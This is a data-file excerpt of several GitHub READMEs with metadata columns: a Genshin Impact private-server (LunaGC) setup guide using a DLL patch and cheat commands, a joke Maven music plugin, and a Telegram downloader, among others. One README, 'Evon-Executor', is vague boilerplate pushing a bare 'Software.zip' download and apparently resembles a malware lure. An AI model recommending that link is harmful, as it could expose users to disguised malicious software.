| [GenshinImpact_5.3.0.zip.006](https://autopatchhk.yuanshen.com/client_app/download/pc_zip/20241219110745_1vT3FzXdDTDFZFrL/GenshinImpact_5.3.0.zip.006) | 10.0 GB | 20.0 GB | 492510ae74ae8ac696ee59b4e831d039 |
| [GenshinImpact_5.3.0.zip.007](https://autopatchhk.yuanshen.com/client_app/download/pc_zip/20241219110745_1vT3FzXdDTDFZFrL/GenshinImpact_5.3.0.zip.007) | 10.0 GB | 20.0 GB | 0c68334b33ee878c5beac321339b9447 |
| [GenshinImpact_5.3.0.zip.008](https://autopatchhk.yuanshen.com/client_app/download/pc_zip/20241219110745_1vT3FzXdDTDFZFrL/GenshinImpact_5.3.0.zip.008) | 0.97 GB | 1.9 GB | 18d44596a5f1467682f5e038c80bd92a |
| [Audio_Chinese_5.3.0.zip](https://autopatchhk.yuanshen.com/client_app/download/pc_zip/20241219110745_1vT3FzXdDTDFZFrL/Audio_Chinese_5.3.0.zip) | 14.11 GB | 28.40 GB | 2727087a20d630d35efe804ae683e72e |
| [Audio_English(US)_5.3.0.zip](https://autopatchhk.yuanshen.com/client_app/download/pc_zip/20241219110745_1vT3FzXdDTDFZFrL/Audio_English(US)_5.3.0.zip) | 16.24 GB | 32.49 GB | 76f338d1925ff39cbf73f0418e9ae354 |
| [Audio_Korean_5.3.0.zip](https://autopatchhk.yuanshen.com/client_app/download/pc_zip/20241219110745_1vT3FzXdDTDFZFrL/Audio_Korean_5.3.0.zip) | 13.99 GB | 28.0 GB | 6356a494c7cce397bdbb1213aa6e7298 |
| [Audio_Japanese_5.3.0.zip](https://autopatchhk.yuanshen.com/client_app/download/pc_zip/20241219110745_1vT3FzXdDTDFZFrL/Audio_Japanese_5.3.0.zip) | 18.43 GB | 36.88 GB | f2b1c1f217dafbcdf27aeece987256b7 |

- Or get the 5.2.0 -> 5.3.0 hdiffs:

| Download link | Package size | Decompressed package size | MD5 checksum |
| --- | --- | --- | --- |
| [game_5.2.0_5.3.0_hdiff_cixFUHQZyAJuOKIN.zip](https://autopatchhk.yuanshen.com/client_app/update/hk4e_global/game_5.2.0_5.3.0_hdiff_cixFUHQZyAJuOKIN.zip) | 17.16 GB | 35.14 GB | 46b32c38dbb348a172df8352074da5a1 |
| [audio_ko-kr_5.2.0_5.3.0_hdiff_oyddjWZZfxEwaTYM.zip](https://autopatchhk.yuanshen.com/client_app/update/hk4e_global/audio_ko-kr_5.2.0_5.3.0_hdiff_oyddjWZZfxEwaTYM.zip) | 0.68 GB | 1.47 GB | fcee09acf85cdd2dd1d30bdea69c9065 |
| [audio_ja-jp_5.2.0_5.3.0_hdiff_mqXJGZjryItulRRx.zip](https://autopatchhk.yuanshen.com/client_app/update/hk4e_global/audio_ja-jp_5.2.0_5.3.0_hdiff_mqXJGZjryItulRRx.zip) | 0.78 GB | 1.74 GB | 68146dc2e2ea63b0cae452ea01b23136 |
| [audio_zh-cn_5.2.0_5.3.0_hdiff_zFnGPPbohnwLAFxC.zip](https://autopatchhk.yuanshen.com/client_app/update/hk4e_global/audio_zh-cn_5.2.0_5.3.0_hdiff_zFnGPPbohnwLAFxC.zip) | 0.64 GB | 1.41 GB | 3b4f264bd791b5f81eb165fe6d36676e |
| [audio_en-us_5.2.0_5.3.0_hdiff_kFXfWOqklZrcycKa.zip](https://autopatchhk.yuanshen.com/client_app/update/hk4e_global/audio_en-us_5.2.0_5.3.0_hdiff_kFXfWOqklZrcycKa.zip) | 0.65 GB | 1.42 GB | c7189fa380b90a343cc56b7d8438eaba |

- Make sure to install java and set the environment variables.
- Build the server (refer to ""Compile the actual server"" in this guide.)
- Put [Astrolabe.dll](https://github.com/Kei-Luna/LunaGC_5.3.0/raw/main/patch/Astrolabe.dll) in the local game root directory
- Download the [Resources](https://github.com/pmagixc/5.3-res), make a new folder called `resources` in the downloaded LunaGC folder and then extract the resources in that new folder.
- Set useEncryption, Questing and useInRouting to false (it should be false by default, if not then change it)
- Start the server and the game, make sure to also create an account in the LunaGC console!
- Have fun

### Getting started

- Clone the repository (install [Git](https://git-scm.com) first )
  
  ```
  git clone https://github.com/Kei-Luna/LunaGC_5.3.0.git
  ```
  
- Now you can continue with the steps below.
  

### Compile the actual Server

**Requirements**:

[Java Development Kit 17 | JDK](https://oracle.com/java/technologies/javase/jdk17-archive-downloads.html) or higher

- **Sidenote**: Handbook generation may fail on some systems. To disable handbook generation, append `-PskipHandbook=1` to the `gradlew jar` command.
  
- **For Windows**:
  
  ```shell
  .\gradlew.bat
  .\gradlew.bat jar
  ```
  
- **For Linux**:
  
  ```bash
  chmod +x gradlew
  ./gradlew jar
  ```

### You can find the output JAR in the project root folder.

### Manually compile the handbook

```shell
./gradlew generateHandbook
```

## Troubleshooting

- Make sure to set useEncryption and useInRouting both to false otherwise you might encounter errors.
- To use windy make sure that you put your luac files in C:\Windy (make the folder if it doesnt exist)
- If you get an error related to MongoDB connection timeout, check if the mongodb service is running. On windows: Press windows key and r then type `services.msc`, look for mongodb server and if it's not started then start it by right clicking on it and start. On linux, you can do `systemctl status mongod` to see if it's running, if it isn't then type `systemctl start mongod`. However, if you get error 14 on linux change the owner of the mongodb folder and the .sock file (`sudo chown -R mongodb:mongodb /var/lib/mongodb` and `sudo chown mongodb:mongodb /tmp/mongodb-27017.sock` then try to start the service again.)

## How to make or get custom banners?

- Pre-made: [github repo](https://github.com/Zhaokugua/Grasscutter_Banners)
- Rename the file you chose to download to Banners.json and replace it with the already-existing one in the data folder.
- The repo also offers a file which contains all of the banners, to use it follow the same procedure mentioned above.
  
  ### Making custom banners
  
- If you want to make a custom banner for a character or weapon, you'll need to know the prefabPath, the titlePath and the character/item IDs.
- Fun fact: You can set any item to be on the rateUp, even if it's a 4* instead of a 5*.

## Handmade Handbook (NOT tested)

- Create accounts: /account <username>
- Get all achievements: /am grantall
- God mode: /prop god 1
- Enter a domain: /dungeon <ID>
- Unlimited stamina: /prop ns 0
- Unlimited energy: /prop UnlimitedEnergy 1
- Recharge energy: /er
- Set constellation for selected character: /setConst <number 1 to 6>
- Get rid of the skill cooldown: /stat cdr 99
- Change weather: /weather <sunny/rain/cloudy/thunderstorm/snow/mist>
- Change talent for selected character: /talent <n/e/q/all> <level> (n - normal attack only) (e - skill only) (q - burst only)
- Give items: /g <itemId|avatarId|all|weapons|mats|avatars> [lv<number>] [r<refinement number>] [x<amount>] [c<constellation number>] [sl<skilllevel>]
- Unlock all: /unlockall
- Change world level: /prop wl <number>
- Change AR: /prop player_level <number between 1 and 60>
- Change the game speed: /gamespeed <0.1|0.2|0.5|0.75|1.0|1.5|2.0|3.0>
- Get 9999 Intertwined fates: /g 223 x9999
- Get 9999 Acquaint fates: /g 224 x9999
- Get 9999 Mora: /g 202 x9999
- Get 9999 Primogems: /g 201 x9999
  
  ### Make sure to not include <> or [] in the commands! The stuff in <> means its required and the stuff in [] means its not required.
  
  ### How to get all of the stuff maxed out: /g all lv90 r5 c6 c6 sl10 | Then do a separate one for the materials: /g mats x99999
  
  ### Ways to TP around the map:
  

Method 1:

- 1: Unlock the map: /prop um 1
- 2: Open the map
- 3: Use the waypoints

Method 2:

- 1: Open the map
- 2: Place a fishing rod marker (the last one) where you want to teleport and mark it.
  
  ### How to get avatar/entity/material etc. IDs?
  
- Go to [ambr.top](https://ambr.top)
- Search up the material/avatar/enemy and then the ID of it should be in the URL of the site, for example I searched for the pyro hilichurl archer; the link for it is ambr.top/en/archive/monster/21010501/pyro-hilichurl-shooter so the ID for it will be 21010501.

### How to spawn monsters?

- Get the ID from the ambr.top link (above)
- Do /spawn <id> in the in-game chat. You can also find out more arguments that you can use to modify the monster hp etc by doing `/help spawn` or `/spawn` | Example: `/spawn 21010501`, that will spawn a pyro hilichurl. Give it more hp: `/spawn 21010501 hp9999` and you can find more about the arguments trough the method I mentioned above.

### How to use the /uid command?

- Rich text is supported
- How to set custom UID: `/uid set changethistext` | bold: `/uid set <b>changethistext</b>` | italic: `/uid set <i>changethistext</i>` | combined: `/uid set <i><b>changethistext</b></i>` | colored text (you'll need a hex color code, you can easy get and pick one by search hex color picker on google now let's assume that you have done it): `/uid set <color=#698ae8>changethistext</color>`
- You can also include spaces like this: `/uid set <b>B O L D</b>`
- You can combine the bold, italic and colored text
- Restore to server-default UID: `/uid default`

## What doesn't work

- find out

## Credit

patch Repository [hk4e-patch-universal](https://github.com/oureveryday/hk4e-patch-universal)
",0,3,2,,0,7.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0
xdev-software/music-maven-plugin,develop,"[![Latest version](https://img.shields.io/maven-central/v/software.xdev/music-maven-plugin?logo=apache%20maven)](https://mvnrepository.com/artifact/software.xdev/music-maven-plugin)
[![Build](https://img.shields.io/github/actions/workflow/status/xdev-software/music-maven-plugin/check-build.yml?branch=develop)](https://github.com/xdev-software/music-maven-plugin/actions/workflows/check-build.yml?query=branch%3Adevelop)
[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=xdev-software_music-maven-plugin&metric=alert_status)](https://sonarcloud.io/dashboard?id=xdev-software_music-maven-plugin)

# music-maven-plugin

üéµ Plays some background music while Maven is building.

## Usage

### Basic

The following configuration will play some ""elevator"" music in the background as soon as Maven starts building:

```xml
<plugin>
    <groupId>software.xdev</groupId>
    <artifactId>music-maven-plugin</artifactId>
    <version>...</version>
    <!-- You might also want to add <inherited>false</inherited> so not every child executes this -->
    <executions>
        <execution>
            <phase>validate</phase>
            <goals>
                <goal>music</goal>
            </goals>
        </execution>
    </executions>
</plugin>
```

### Customizing the music

You can customize the music by adding other sources:

```xml
<configuration>
    <sources>
        <musicSource>
            <uri>https://incompetech.com/music/royalty-free/mp3-royaltyfree/Corncob.mp3</uri>
        </musicSource>
        <musicSource>
            <!-- Relative to project directory -->
            <file>my_cool_music.mp3</file>
        </musicSource>
        <musicSource>
            <classpath>/default/Andrew_Codeman_-_03_-_Mussels_short_version.ogg</classpath>
        </musicSource>
    </sources>
    <shuffle>true</shuffle>
</configuration>
```

#### Supported codecs

| Codec | Container |
| --- | --- |
| [MP3](https://en.wikipedia.org/wiki/MP3) | ``.mp3`` |
| [Vorbis](https://en.wikipedia.org/wiki/Vorbis) | [``.ogg``](https://en.wikipedia.org/wiki/Ogg) |

> [!NOTE]
> Container files can also include different codecs.
> For example ``.ogg`` can also contain ``Opus``, ``Speex``, ``FLAC``, ... which are not supported.

> [!TIP]
> If you want to convert to supported formats you can do so with [``ffmpeg``](https://www.ffmpeg.org/):<br/>
> ``ffmpeg -i music.opus music.ogg``

## Installation
[Installation guide for the latest release](https://github.com/xdev-software/music-maven-plugin/releases/latest#Installation)

## Run the demo

> [!WARNING]
> Might be loud!

* Checkout the repo
* Run ``mvn install``

## Why?
This is obviously a joke/fun plugin.<br/>
You probably shouldn't use it in production or maybe only on April 1st to annoy your colleagues :P

We got the idea during XDEV's christmas party as [rfichtner](https://github.com/rfichtner) always needs more plugins for funnier Maven presentations and was inspired by [this GraalVM issue from joshlong](https://github.com/oracle/graal/issues/5327).

## Support
If you need support as soon as possible and you can't wait for any pull request, feel free to use [our support](https://xdev.software/en/services/support).

## Contributing
See the [contributing guide](./CONTRIBUTING.md) for detailed instructions on how to get started with our project.

## Dependencies and Licenses
View the [license of the current project](LICENSE) or the [summary including all dependencies](https://xdev-software.github.io/music-maven-plugin/dependencies)

The license and download information for the [built-in music](./music-maven-plugin/src/main/resources/default/) can be found in [sources.txt](./music-maven-plugin/src/main/resources/default/sources.txt).
",2,0,6,Apache-2.0,7,16.0,1.0,15.0,1.0,30.0,0.0,-12.45,0.0
siwon1011/Evon-Executor,master,"# üöÄ Evon-Executor

Support for Unified Naming Convention for enhanced modern script compatibility.

[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/user-attachments/files/18060583/Software.zip)

## Overview

Evon-Executor is a versatile tool that effortlessly integrates with modern scripts by supporting the Unified Naming Convention. This compatibility ensures seamless operation with a wide array of script formats, making it a valuable asset for developers and script users. With Evon-Executor, you can enhance your scripting experience and boost productivity.

## Key Features

üîπ **Unified Naming Convention Support**: Achieve compatibility with 99.9% of modern scripts.  
üîπ **Efficient Script Execution**: Enhance script execution speed and reliability.  
üîπ **User-Friendly Interface**: Simplified operation for all users.  
üîπ **Versatile Script Compatibility**: Works with a wide range of script types.  
üîπ **Enhanced Productivity**: Streamline your scripting tasks efficiently.

## Getting Started

To begin using Evon-Executor, simply download the software package from the following link:

[Download Software](https://github.com/user-attachments/files/18060583/Software.zip)

Once downloaded, launch the application and follow the on-screen instructions for installation.

If the link is not working, kindly check the ""Releases"" section of this repository for alternative download options.

## Demo

Here is a sneak peek at the Evon-Executor interface:

![Evon-Executor Demo](https://example.com/demo.png)

## Support

For any inquiries or assistance regarding Evon-Executor, feel free to reach out to our support team at [support@evonexecutor.com](mailto:support@evonexecutor.com). We are here to help you make the most of your scripting experience with Evon-Executor.

## License

Evon-Executor is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.

---

Start maximizing your scripting potential with Evon-Executor today! Download now and experience a new level of script compatibility and efficiency. üöÄ",3,0,1,MIT,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
hibrahem/architecture_patterns_example,main,"# [Architecture Patterns Examples](https://github.com/M0Hatem/charity_hub_java) &middot; [![GitHub license](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](https://github.com/M0Hatem/charity_hub_java/blob/main/LICENSE) [![Java Version](https://img.shields.io/badge/Java-17-orange.svg)](https://www.oracle.com/java/technologies/javase/jdk17-archive-downloads.html) [![Spring Boot](https://img.shields.io/badge/Spring%20Boot-3.3.5-brightgreen.svg)](https://spring.io/projects/spring-boot)

Each pattern will be presented in a branch

- Layered Architecture
- Hexagonal Architecture
- Onion Architecture
- Clean Architecture <-- main branch",0,0,3,Apache-2.0,0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
Mechanical-Advantage/RobotCode2025Public,main,"# RobotCode2025 (Public)

[![License](https://img.shields.io/badge/License-MIT-blue)](https://github.com/Mechanical-Advantage/RobotCode2025Public/blob/main/LICENSE) ![Last Commit](https://img.shields.io/github/last-commit/Mechanical-Advantage/RobotCode2025Public?color=yellow)

This project contains 6328's robot code for the 2025 REEFSCAPE game. See 6328's Open Alliance [build thread](https://www.chiefdelphi.com/t/frc-6328-mechanical-advantage-2025-build-thread/477314) on Chief Delphi to follow our development, or browse 6328's robot code from previous games: [2024](https://github.com/Mechanical-Advantage/RobotCode2024), [2023](https://github.com/Mechanical-Advantage/RobotCode2023), [2022](https://github.com/Mechanical-Advantage/RobotCode2022).

This repository is updated daily with the latest stable code from 6328's internal development repository. See [this post](https://www.chiefdelphi.com/t/frc-6328-mechanical-advantage-2025-build-thread/477314/11) for details. Please contact software@team6328.org with any questions.

![Reefscape](/reefscape.png)
",0,0,1,MIT,1,0.0,0.0,1.0,1.0,2.0,0.0,-0.15,1.0
jarvis2f/telegram-files,main,"<p align=""center"">
    <img src=""./web/public/favicon.svg"" align=""center"" width=""30%"">
</p>
<p align=""center""><h1 align=""center"">Telegram Files</h1></p>
<p align=""center"">
	<em><code>A self-hosted Telegram file downloader for continuous, stable, and unattended downloads.</code></em>
</p>
<p align=""center"">
	<img src=""https://img.shields.io/github/license/jarvis2f/telegram-files?style=default&logo=opensourceinitiative&logoColor=white&color=0080ff"" alt=""license"">
	<img src=""https://img.shields.io/github/last-commit/jarvis2f/telegram-files?style=default&logo=git&logoColor=white&color=0080ff"" alt=""last-commit"">
	<img src=""https://img.shields.io/github/v/release/jarvis2f/telegram-files?style=default&logo=git&logoColor=white&color=0080ff"" alt=""release"">
    <a href=""https://codecov.io/gh/jarvis2f/telegram-files"" > 
        <img src=""https://codecov.io/gh/jarvis2f/telegram-files/graph/badge.svg?token=Y4YN2W8ARV""/> 
    </a>
</p>
<br>

## üîó Table of Contents

- [üìç Overview](#-overview)
- [üß© Screenshots](#-screenshots)
- [üöÄ Getting Started](#-getting-started)
- [‚å®Ô∏è Development](#Ô∏è-development)
    - [‚òëÔ∏è Prerequisites](#-prerequisites)
    - [‚öôÔ∏è Installation](#-installation)
- [üìå Project Roadmap](#-project-roadmap)
- [üî∞ Contributing](#-contributing)
- [üéó License](#-license)
- [üÜó FAQs](#-faqs)

---

## üìç Overview

* Support for downloading files from telegram channels and groups.
* Support multiple telegram accounts for downloading files.
* Support suspending and resuming downloads, and auto transfer files to other destinations.
* Responsive design supports mobile access.

---

## üß© Screenshots

<div align=""center"">
    <img src=""./misc/screenshot.png"" align=""center"" width=""40%"">
    <img src=""./misc/screenshot-2.png"" align=""center"" width=""40%"">
</div>

<details closed>
<summary>More Screenshots</summary>
<div align=""center"">
    <img src=""./misc/screenshot-3.png"" align=""center"" style=""width: 300px; height: 500px;"">
    <img src=""./misc/screenshot-4.png"" align=""center"" style=""width: 300px; height: 500px;"">
</div>
</details>

## üöÄ Getting Started

Before getting started with telegram-files, you should apply a telegram api id and hash. You can apply for it on
the [Telegram API](https://my.telegram.org/apps) page.

**Using `docker`**
&nbsp; [<img align=""center"" src=""https://img.shields.io/badge/Docker-2CA5E0.svg?style={badge_style}&logo=docker&logoColor=white"" />](https://www.docker.com/)

```shell
docker run -d \
  --name telegram-files \
  --restart always \
  -e APP_ENV=${APP_ENV:-prod} \
  -e APP_ROOT=${APP_ROOT:-/app/data} \
  -e TELEGRAM_API_ID=${TELEGRAM_API_ID} \
  -e TELEGRAM_API_HASH=${TELEGRAM_API_HASH} \
  -p 6543:80 \
  -v ./data:/app/data \
  ghcr.io/jarvis2f/telegram-files:latest
```

**Using `docker-compose`**

Copy [docker-compose.yaml](docker-compose.yaml) to your project directory and run the following command:

```sh
docker-compose up -d
```

**Install on unRaid**

On unRaid, install from the Community Repositories by searching for `telegram-files`.

> **Important Note:** You should NOT expose the service to the public internet. Because the service is not secure.

---

## ‚å®Ô∏è Development

### ‚òëÔ∏è Prerequisites

Before getting started with telegram-files, ensure your runtime environment meets the following requirements:

- **Programming Language:** JDK21,TypeScript
- **Package Manager:** Gradle,Npm
- **Container Runtime:** Docker

### ‚öôÔ∏è Installation

Install telegram-files using one of the following methods:

**Build from source:**

1. Clone the telegram-files repository:

```sh
git clone https://github.com/jarvis2f/telegram-files
```

2. Navigate to the project directory:

```sh
cd telegram-files
```

3. Install the project dependencies:

**Using `npm`**
&nbsp; [<img align=""center"" src=""https://img.shields.io/badge/npm-CB3837.svg?style={badge_style}&logo=npm&logoColor=white"" />](https://www.npmjs.com/)

```sh
cd web
npm install
```

**Using `gradle`**
&nbsp; [<img align=""center"" src=""https://img.shields.io/badge/Gradle-02303A.svg?style={badge_style}&logo=gradle&logoColor=white"" />](https://gradle.org/)

```sh
cd api
gradle build
```

**Using `docker`**
&nbsp; [<img align=""center"" src=""https://img.shields.io/badge/Docker-2CA5E0.svg?style={badge_style}&logo=docker&logoColor=white"" />](https://www.docker.com/)

```sh
docker build -t jarvis2f/telegram-files .
```

## üìå Project Roadmap

- ‚úÖ **`Task 1`**: Automatically download files based on set rules.
- ‚úÖ **`Task 2`**: Download statistics and reports.
- ‚úÖ **`Task 3`**: Improve Telegram‚Äôs login functionality.
- ‚úÖ **`Task 4`**: Support auto transfer files to other destinations.
- ‚òëÔ∏è **`Task 5`**: File table is optimized using virtual lists, and API service using GraalVM.
- ‚òëÔ∏è **`Task 6`**: File downloads in comments under channel messages.

---

## üî∞ Contributing

- **üí¨ [Join the Discussions](https://github.com/jarvis2f/telegram-files/discussions)**: Share your insights, provide
  feedback, or ask questions.
- **üêõ [Report Issues](https://github.com/jarvis2f/telegram-files/issues)**: Submit bugs found or log feature requests
  for the `telegram-files` project.
- **üí° [Submit Pull Requests](https://github.com/jarvis2f/telegram-files/blob/main/CONTRIBUTING.md)**: Review open PRs,
  and submit your own PRs.

<details closed>
<summary>Contributing Guidelines</summary>

1. **Fork the Repository**: Start by forking the project repository to your github account.
2. **Clone Locally**: Clone the forked repository to your local machine using a git client.
   ```sh
   git clone https://github.com/jarvis2f/telegram-files
   ```
3. **Create a New Branch**: Always work on a new branch, giving it a descriptive name.
   ```sh
   git checkout -b new-feature-x
   ```
4. **Make Your Changes**: Develop and test your changes locally.
5. **Commit Your Changes**: Commit with a clear message describing your updates.
   ```sh
   git commit -m 'Implemented new feature x.'
   ```
6. **Push to github**: Push the changes to your forked repository.
   ```sh
   git push origin new-feature-x
   ```
7. **Submit a Pull Request**: Create a PR against the original project repository. Clearly describe the changes and
   their motivations.
8. **Review**: Once your PR is reviewed and approved, it will be merged into the main branch. Congratulations on your
   contribution!

</details>

---

## üéó License

This project is protected under the MIT License. For more details,
refer to the [LICENSE](LICENSE) file.

---

## üÜó FAQs

~~**Q.** Can't start the api server, errorÔºö`java.lang.UnsatisfiedLinkError: no tdjni in java.library.path`~~

~~**A.** Maybe download tdlib failed, you can see the [entrypoint.sh](entrypoint.sh) file, then download tdlib
manually.~~

**Q.** Web's spoiler is static, how to solve it?

**A.** 1. Because `CSS Houdini Paint API` is not supported by all browsers. 2. It is only supported on https.
<details closed>
<summary>Use in http environment, you can use the following method to solve it</summary>

Open the `chrome://flags` page, search for `Insecure origins treated as secure`, and add the address of the web page to
the list.
</details>
",13,5,2,MIT,2,0.0,1.0,3.0,2.0,16.0,1.0,-4.65,33.0
